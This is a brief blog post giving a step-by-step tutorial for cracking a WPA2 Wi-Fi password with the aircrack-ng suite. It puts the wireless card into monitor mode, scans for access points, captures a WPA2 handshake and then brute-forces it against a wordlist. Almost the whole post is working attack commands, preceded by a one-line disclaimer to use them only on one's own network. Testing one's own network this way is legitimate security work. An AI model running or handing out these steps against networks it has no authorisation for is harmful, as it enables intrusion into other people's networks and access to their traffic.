---
layout: post
title: "Crack WPA2 WLAN Password with aircrack-ng"
fav: 1
---

> **Disclaimer**: This might be illegal in some countries. Perform this attack on your own network only!

1. Put WLAN device into monitoring mode:
   ```bash
   airmon-ng start wlan0
   ```
2. Scan for access points:
   ```bash
   airodump-ng wlan0mon
   ```
3. Capture WPA2 handshake (use `<$BSSID>` and `<$CHANNEL>` from the previous scan):
   ```bash
   airodump-ng -c <$CHANNEL> --bssid <$BSSID> -w <$CAPTURE_FILE> wlan0mon
   ```
4. Wait until airodump says '*WPA handshake: ...*' in the upper right of the terminal, then press `Ctrl+c` to stop scanning.
5. Bruteforce the WPA2 handshake with aircrack-ng and a wordlist:
   ```bash
   aircrack-ng <$CAPTURE_FILE>-01.cap  -w <$WORDLIST_FILE>
   ```

---
